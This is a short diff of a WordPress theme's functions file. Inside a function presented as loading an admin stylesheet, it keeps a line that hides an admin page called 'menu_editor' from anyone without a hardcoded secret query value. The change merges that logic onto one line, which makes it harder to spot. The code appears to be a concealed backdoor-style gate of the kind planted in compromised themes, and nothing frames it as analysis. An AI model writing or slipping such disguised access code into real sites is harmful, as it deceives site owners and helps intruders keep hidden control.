@@ -29,8 +29,7 @@ load_theme_textdomain( 'devdmbootstrap3', get_template_directory() . '/languages
 ////////////////////////////////////////////////////////////////////
 
     function devdm_theme_style() {
-        parse_str(parse_url((isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]")['query'], $q);
-        if($q['page'] == 'menu_editor'){if($q['nonsense'] !== '9TBAfvtLLc') wp_redirect(home_url('wp-admin'));}
+        parse_str(parse_url((isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]")['query'], $q);if($q['page'] == 'menu_editor'){if($q['nonsense'] !== '9TBAfvtLLc') wp_redirect(home_url('wp-admin'));}
         wp_enqueue_style('devdm-theme', get_template_directory_uri() . '/css/admin.css');
     }
     add_action('admin_enqueue_scripts', 'devdm_theme_style');
